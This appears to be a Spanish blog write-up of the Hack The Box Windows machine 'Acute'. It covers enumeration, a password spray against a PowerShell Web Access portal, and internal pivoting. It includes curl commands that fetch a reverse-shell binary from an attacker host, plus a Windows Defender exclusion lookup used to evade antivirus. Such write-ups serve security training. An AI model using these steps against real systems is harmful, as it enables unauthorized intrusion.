<!doctype html><html lang="es"><head><title>Acute | 7Rocky</title><meta charset="utf-8"><meta http-equiv="x-ua-compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta name="description" content="Hack The Box. Windows. Máquina difícil. Esta máquina expone una página web donde se puede encontrar un documento de Word con información sensible y nombres de usuarios. Existe un acceso web a PowerShell en el cual podemos acceder utilizando una credencial débil y extraer otra contraseña a partir de una captura de pantalla. Existe un controlador de dominio de un entorno de Active Directory donde podemos ejecutar comandos como otros usuarios. Podremos conectarnos a la primera máquina y extraer hashes NTLM y finalmente convertirnos en administrador del dominio. Para comprometer esta máquina se necesitan conocimientos de PowerShell y técnicas básicas de explotación de Windows y Active Directory"><meta itemprop="description" content="Hack The Box. Windows. Máquina difícil. Esta máquina expone una página web donde se puede encontrar un documento de Word con información sensible y nombres de usuarios. Existe un acceso web a PowerShell en el cual podemos acceder utilizando una credencial débil y extraer otra contraseña a partir de una captura de pantalla. Existe un controlador de dominio de un entorno de Active Directory donde podemos ejecutar comandos como otros usuarios. Podremos conectarnos a la primera máquina y extraer hashes NTLM y finalmente convertirnos en administrador del dominio. Para comprometer esta máquina se necesitan conocimientos de PowerShell y técnicas básicas de explotación de Windows y Active Directory"><meta name="twitter:card" content="Hack The Box. Windows. Máquina difícil. Esta máquina expone una página web donde se puede encontrar un documento de Word con información sensible y nombres de usuarios. Existe un acceso web a PowerShell en el cual podemos acceder utilizando una credencial débil y extraer otra contraseña a partir de una captura de pantalla. Existe un controlador de dominio de un entorno de Active Directory donde podemos ejecutar comandos como otros usuarios. Podremos conectarnos a la primera máquina y extraer hashes NTLM y finalmente convertirnos en administrador del dominio. Para comprometer esta máquina se necesitan conocimientos de PowerShell y técnicas básicas de explotación de Windows y Active Directory"><meta name="twitter:description" content="Hack The Box. Windows. Máquina difícil. Esta máquina expone una página web donde se puede encontrar un documento de Word con información sensible y nombres de usuarios. Existe un acceso web a PowerShell en el cual podemos acceder utilizando una credencial débil y extraer otra contraseña a partir de una captura de pantalla. Existe un controlador de dominio de un entorno de Active Directory donde podemos ejecutar comandos como otros usuarios. Podremos conectarnos a la primera máquina y extraer hashes NTLM y finalmente convertirnos en administrador del dominio. Para comprometer esta máquina se necesitan conocimientos de PowerShell y técnicas básicas de explotación de Windows y Active Directory"><meta property="og:description" content="Hack The Box. Windows. Máquina difícil. Esta máquina expone una página web donde se puede encontrar un documento de Word con información sensible y nombres de usuarios. Existe un acceso web a PowerShell en el cual podemos acceder utilizando una credencial débil y extraer otra contraseña a partir de una captura de pantalla. Existe un controlador de dominio de un entorno de Active Directory donde podemos ejecutar comandos como otros usuarios. Podremos conectarnos a la primera máquina y extraer hashes NTLM y finalmente convertirnos en administrador del dominio. Para comprometer esta máquina se necesitan conocimientos de PowerShell y técnicas básicas de explotación de Windows y Active Directory"><meta property="og:type" content="article"><meta name="robots" content="index, follow"><meta name="author" content="7Rocky"><meta name="twitter:author" content="7Rocky"><meta property="og:author" content="7Rocky"><meta name="image" content="https://7rocky.github.io/images/HTB/Acute/Acute.png"><meta name="twitter:image" content="https://7rocky.github.io/images/HTB/Acute/Acute.png"><meta property="og:image" content="https://7rocky.github.io/images/HTB/Acute/Acute.png"><meta property="og:site_name" content="7Rocky"><meta itemprop="name" content="Acute"><meta property="twitter:title" content="Acute"><meta property="og:title" content="Acute"><meta property="og:url" content="https://7rocky.github.io/htb/acute/"><meta itemprop="keywords" content="mimikatz,powershell,cronjob,password-spray,active-directory,screenshots,file-permissions,metadata,hash-cracking,"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script><link rel="shortcut icon" href="favicon.ico" type="image/x-icon"><link href="/css/style.css" rel="stylesheet"><link href="/css/main.css" rel="stylesheet"><link href="/css/monokai-sublime.min.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><script src="/js/highlight.min.js"></script>
<script>hljs.configure({ignoreUnescapedHTML:!0}),hljs.highlightAll()</script><script src="/js/htb.js"></script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="/" title="es"><img alt="es" height="30px" src="/images/es.png" width="30px"></a>
<a class="link-transition lang link dib z-999 pt3 pt0-l" href="/en/htb/acute/" title="en"><img alt="en" height="30px" src="/images/en.png" style="border:4px solid#000;border-radius:100%" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb7" role="main"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-100"><aside aria-label="aside" class="instapaper_ignoref b helvetica tracked">HTB</aside><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/htb/acute/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg></a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/htb/acute/&text=Acute" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&url=https://7rocky.github.io/htb/acute/&title=Acute" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">Acute</h1><time class="f6 mv4 dib tracked" datetime="2022-07-16T00:00:00+01:00">16 / 07 / 2022</time></header><div class="htb-image"><img alt="Acute" src="/images/HTB/Acute/Acute.png"></div><ul class="nested-links tags"><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/mimikatz" title="Mimikatz">Mimikatz</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/powershell" title="PowerShell">PowerShell</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/cronjob" title="Tareas Cron">Tareas Cron</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/password-spray" title="Password spray">Password spray</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/active-directory" title="Active Directory">Active Directory</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/screenshots" title="Capturas de pantalla">Capturas de pantalla</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/file-permissions" title="Permisos de archivos">Permisos de archivos</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/metadata" title="Metadatos de archivos">Metadatos de archivos</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/hash-cracking" title="Descifrado de hashes de contraseñas">Descifrado de hashes de contraseñas</a></li></ul><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin-bottom:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#escaneo-de-puertos">Escaneo de puertos</a></li><li><a href="#enumeración-web">Enumeración web</a></li><li><a href="#enumeración-de-usuarios">Enumeración de usuarios</a></li><li><a href="#analizando-acute-pc01">Analizando <code>Acute-PC01</code></a></li><li><a href="#capturas-de-pantalla-de-una-sesión-de-escritorio-remoto">Capturas de pantalla de una sesión de escritorio remoto</a></li><li><a href="#ejecutando-comandos-en-el-controlador-de-dominio">Ejecutando comandos en el controlador de dominio</a></li><li><a href="#extracción-de-_hashes_-ntlm">Extracción de <em>hashes</em> NTLM</a></li><li><a href="#movimiento-lateral-al-usuario-awallace">Movimiento lateral al usuario <code>awallace</code></a></li><li><a href="#escalada-de-privilegios-a-administrador-del-dominio">Escalada de privilegios a administrador del dominio</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><ul><li><strong>SO</strong>: Windows</li><li><strong>Dificultad</strong>: Difícil</li><li><strong>Dirección IP</strong>: 10.10.11.145</li><li><strong>Fecha</strong>: 12 / 02 / 2022</li></ul><h2 id="escaneo-de-puertos">Escaneo de puertos</h2><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"># Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.145 -p 443
Nmap scan report for 10.10.11.145
Host is up (0.072s latency).

PORT    STATE SERVICE  VERSION
443/tcp open  ssl/http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
| ssl-cert: Subject: commonName=atsserver.acute.local
| Subject Alternative Name: DNS:atsserver.acute.local, DNS:atsserver
| Not valid before: 2022-01-06T06:34:58
|_Not valid after:  2030-01-04T06:34:58
|_ssl-date: 2022-02-12T19:04:45+00:00; -17s from scanner time.
| tls-alpn:
|_  http/1.1
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -17s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
# Nmap done -- 1 IP address (1 host up) scanned in 26.62 seconds
</code></pre></div><p>La máquina tiene abierto el puerto 443 (HTTPS).</p><h2 id="enumeración-web">Enumeración web</h2><p>Si vamos a <code>https://10.10.11.145</code>, no veremos nada:</p><p><img src="/images/HTB/Acute/Acute-not-found.png" alt="Web not found"></p><p>Podemos encontrar un subdominio llamado <code>atsserver.acute.local</code> en la salida de <code>nmap</code>. Ahora podemos añadirlo a <code>/etc/hosts</code> y también <code>acute.local</code> por si acaso. Y vemos una página web al ir a <code>https://atsserver.acute.local</code>:</p><p><img src="/images/HTB/Acute/Acute-index.png" alt="Acute Health"></p><p>Existe una sección de &ldquo;<em>about</em>&rdquo; donde podmeos descargar un documento de Microsoft Word (<code>.docx</code>), pinchando en la esquina superior derecha en un botón llamado &ldquo;New Starter Forms&rdquo;:</p><p><img src="/images/HTB/Acute/Acute-about.png" alt="Acute Health about"></p><p>El archivo de Word contiene algunas instrucciones para los empleados que se unen a la empresa. La información más interesante es esta:</p><blockquote><p><em>The University’s staff induction pages can be found at:</em> <a href="https://atsserver.acute.local/Staff">https://atsserver.acute.local/Staff</a></p></blockquote><blockquote><p><em>The Staff Induction portal can be found here:</em> <a href="https://atsserver.acute.local/Staff/Induction">https://atsserver.acute.local/Staff/Induction</a></p></blockquote><blockquote><p><em>Arrange for the new starter to receive a demonstration on using IT tools which may include MUSE, myJob and Google accounts. Walk the new starter through the password change policy, they will need to change it from the default</em> Password1!. <em>Not all staff are changing these so please be sure to run through this</em></p></blockquote><blockquote><p><em>Run through the new PSWA to highlight the restrictions set on the sessions named</em> dc_manage</p></blockquote><blockquote><p><em>Complete the remote</em> (<a href="https://atsserver.acute.local/acute_staff_access">https://atsserver.acute.local/acute_staff_access</a>) <em>training</em></p></blockquote><blockquote><p><em>Lois is the only authorized personnel to change Group Membership, Contact Lois to have this approved and changed if required. Only Lois can become site admin</em></p></blockquote><p>Hemos encontrado tres nuevas URL, aunque solo una funciona:</p><p><img src="/images/HTB/Acute/Acute-pswa.png" alt="Acute PSWA"></p><p>Genial, esto es un portal de acceso a un ordenador por PowerShell (PWSA), pero necesitamos credenciales y un nombre de ordenador al que conectarnos.</p><h2 id="enumeración-de-usuarios">Enumeración de usuarios</h2><p>Como en muchar máquinas Windows, los nombres de usuarios son importantes para la explotación.</p><p>El documento de Word muestra un usuario llamado <code>Lois</code> y una contraseña potencial: <code>Password1!</code>.</p><p>Mirando a los metadatos utilizando <code>exiftool</code> vemos más cosas:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">exiftool</span> <span class="mtku">New_Starter_CheckList_v7.docx</span>
ExifTool Version Number         : 12.30
File Name                       : New_Starter_CheckList_v7.docx  
...
Zip Compressed Size             : 428
Zip Uncompressed Size           : 2527
Zip File Name                   : [Content_Types].xml
Creator                         : FCastle
Description                     : Created on Acute-PC01
Last Modified By                : Daniel
Revision Number                 : 8
Last Printed                    : 2021:01:04 15:54:00Z
Create Date                     : 2021:12:08 14:21:00Z
Modify Date                     : 2021:12:22 00:39:00Z
Template                        : Normal.dotm
Total Edit Time                 : 2.6 hours
Pages                           : 3
Words                           : 886
Characters                      : 5055
Application                     : Microsoft Office Word
Doc Security                    : None
Lines                           : 42
Paragraphs                      : 11
Scale Crop                      : No
Heading Pairs                   : Title, 1
Titles Of Parts                 :
Company                         : University of Marvel
Links Up To Date                : No
Characters With Spaces          : 5930
Shared Doc                      : No
Hyperlinks Changed              : No
App Version                     : 16.0000
</code></pre></div><p>Tenemos dos nombres de usuario (<code>FCastle</code> y <code>Daniel</code>) y un nombre de ordenador (<code>Acute-PC01</code>).</p><p>Ahora podemos utilizar este nombre de ordenador, la contraseña u los nombres de usuarios para entrar a PSWA, pero no funcionan.</p><p>De hecho, podemos encontrar más usuarios en la sección de &ldquo;<em>about</em>&rdquo; de la página web:</p><p><img src="/images/HTB/Acute/Acute-about-users.png" alt="Acute about users"></p><p>Como hay un nombre de usuario llamado <code>FCastle</code>, podemos deducir que los nombres de usuario se obtienen con la primera letra del nombre seguida del apellido.</p><p>Por tanto, tenemos estos nombres de usuarios por el momento:</p><ul><li><code>Lois</code> (<code>LHopkins</code>)</li><li><code>Daniel</code></li><li><code>FCastle</code></li><li><code>AWallace</code></li><li><code>CHall</code></li><li><code>EDavies</code></li><li><code>IMonks</code></li><li><code>JMorgan</code></li></ul><p>Ahora podemos realizar un ataque de <em>password spray</em> para intentar conectarnos a <code>Acute-PC01</code> desde PSWA. La conexión es exitosa para <code>EDavies:Password1!</code>:</p><p><img src="/images/HTB/Acute/Acute-console.png" alt="Acute PSWA console"></p><h2 id="analizando-acute-pc01">Analizando <code>Acute-PC01</code></h2><p>Podemos realizar un reconocimiento básico del sistema:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#021944!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">PS C:\Users\edavies\Documents&gt;
<span class="pwsh-yellow">dir C:\</span>


    Directory: C:\


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----        07/12/2019      9:14                PerfLogs
d-r---        06/12/2021     11:06                Program Files
d-r---        07/12/2021     12:43                Program Files (x86)  
d-r---        21/12/2021     22:50                Users
d-----        21/12/2021     22:53                Utils
d-----        16/12/2021      1:23                Windows


PS C:\Users\edavies\Documents&gt;
<span class="pwsh-yellow">dir C:\Users</span>


    Directory: C:\Users


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----        21/12/2021     13:01                administrator.ACUTE
d-----        22/12/2021      1:26                edavies
d-----        21/12/2021     22:50                jmorgan
d-----        19/11/2021      9:29                Natasha
d-r---        18/11/2020     23:43                Public


PS C:\Users\edavies\Documents&gt;
<span class="pwsh-yellow">ipconfig</span>

Windows IP Configuration


Ethernet adapter Ethernet 2:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::9513:4361:23ec:64fd%14
   IPv4 Address. . . . . . . . . . . : 172.16.22.2
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 172.16.22.1
PS C:\Users\edavies\Documents&gt;
</code></pre></div><p>Vemos que no estamos en la máquina que debemos comprometer porque la dirección IP es <code>172.16.22.2</code> y queremos que sea <code>10.10.11.145</code>.</p><p>Vamos a enumerar un poco más:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#021944!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">PS C:\Users\edavies\Documents&gt;  
<span class="pwsh-yellow">cd C:\Users</span>
PS C:\Users&gt;
<span class="pwsh-yellow">tree</span>
Folder PATH listing
Volume serial number is 8A9A-E124
C:.
ÃÄÄÄadministrator.ACUTE
ÃÄÄÄedavies
³   ÃÄÄÄ3D Objects
³   ÃÄÄÄContacts
³   ÃÄÄÄDesktop
³   ÃÄÄÄDocuments
³   ÃÄÄÄDownloads
³   ÃÄÄÄFavorites
³   ÃÄÄÄLinks
³   ÃÄÄÄMusic
³   ³   ÀÄÄÄPlaylists
³   ÃÄÄÄOneDrive
³   ÃÄÄÄPictures
³   ³   ÀÄÄÄCamera Roll
³   ÃÄÄÄSaved Games
³   ÃÄÄÄSearches
³   ÀÄÄÄVideos
³       ÀÄÄÄCaptures
ÃÄÄÄjmorgan
ÃÄÄÄNatasha
ÀÄÄÄPublic
</code></pre></div><p>No hay nada interesante en las carpetas personales de los usuarios. ¿Tenemos algun privilegio útil o pertenecemos a algún grupo?</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#021944!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">PS C:\Users&gt;
<span class="pwsh-yellow">whoami /all</span>


USER INFORMATION
----------------

User Name     SID
============= ==============================================
acute\edavies S-1-5-21-1786406921-1914792807-2072761762-1106


GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes

========================================== ================ ============ ==================================================  
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1     Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192



PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
</code></pre></div><p>No parece. El <em>gateway</em> de salida de <code>Acute-PC01</code> por defecto es la máquina principal:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#021944!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">PS C:Users\&gt;
<span class="pwsh-yellow">nslookup atsserver.acute.local</span>
DNS request timed out.
    timeout was 2 seconds.
Server:  UnKnown
Address:  172.16.22.1

Name:    atsserver.acute.local
Addresses:  dead:beef::283e:7912:47ab:5601  
    dead:beef::1f9
    172.16.22.1
    10.10.11.145

PS C:Users\&gt;
<span class="pwsh-yellow">nslookup acute.local</span>
DNS request timed out.
    timeout was 2 seconds.
Server:  UnKnown
Address:  172.16.22.1

Name:    acute.local
Addresses:  dead:beef::1f9
    dead:beef::283e:7912:47ab:5601
    172.16.22.1
    10.10.11.145
</code></pre></div><p>Vamos a realizar un escaneo de puertos de esta máquina:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#021944!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">PS C:\Users&gt;
<span class="pwsh-yellow">53,88,135,389,445,1443,5985 | % {echo ((New-Object Net.Sockets.TcpClient).Connect('172.16.22.1', $_)) "Port $_ : open"} 2&gt;$null</span>  
Port 53 : open
Port 88 : open
Port 135 : open
Port 389 : open
Port 445 : open
Port 5985 : open
</code></pre></div><p>Parece un controlador de dominio de un entorno de Active Directory porque tiene abiertos los puertos 53 (DNS), 88 (Kerberos), 135 (MS-RPC), 389 (LDAP) y 445 (SMB).</p><p>Para atacar al controlador de dominio, tendremos que utilizar <code>Acute-PC01</code> como pivote. Utilizaré <a href="https://github.com/jpillora/chisel"><code>chisel</code></a> como <em>proxy</em> SOCKS5 para poder lanzar las herramientas ofensivas de AD desde la máquina de atacante. Podemos compilarlo para Windows o descargar el binario compilado de la sección de descargas.</p><p>Primero de todo, vamos a conseguir una <em>reverse shell</em> para tener algo más de control. Utilizaré <a href="https://github.com/antonioCoco/ConPtyShell"><code>ConPtyShell</code></a>. Si tratamos de subirlo a <code>C:\Windows\Temp</code> mediante un servidor HTTP con Python, Windows Defender lo bloquea:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#021944!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">PS C:\Users&gt;
<span class="pwsh-yellow">cd C:\Windows\Temp</span>
PS C:\Windows\Temp&gt;
<span class="pwsh-yellow">curl http://10.10.17.44/ConPtyShell.exe -o r.exe</span>
PS C:\Windows\Temp&gt;
<span class="pwsh-yellow">.\r.exe</span>
<span class="code-bg-black pwsh-red">Program 'r.exe' failed to run: Operation did not complete successfully because the file contains a virus or potentially unwanted software.  
    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException
    + FullyQualifiedErrorId : NativeCommandFailed </span>
</code></pre></div><p>Podemos consultar las carpetas que no son examinadas mediante esta consulta:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#021944!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">PS C:\Windows\Temp>
<span class="pwsh-yellow">reg query "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"</span>

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths  
    C:\Utils    REG_DWORD    0x0
    C:\Windows\System32    REG_DWORD    0x0
</code></pre></div><p>Como se ve, <code>C:\Utils</code> no se valida. Vamos a descargar el binario aquí entonces:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#021944!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">PS C:\Windows\Temp&gt;
<span class="pwsh-yellow">cd C:\Utils</span>
PS C:\Utils&gt;
<span class="pwsh-yellow">curl http://10.10.17.44/ConPtyShell.exe -o r.exe</span>  
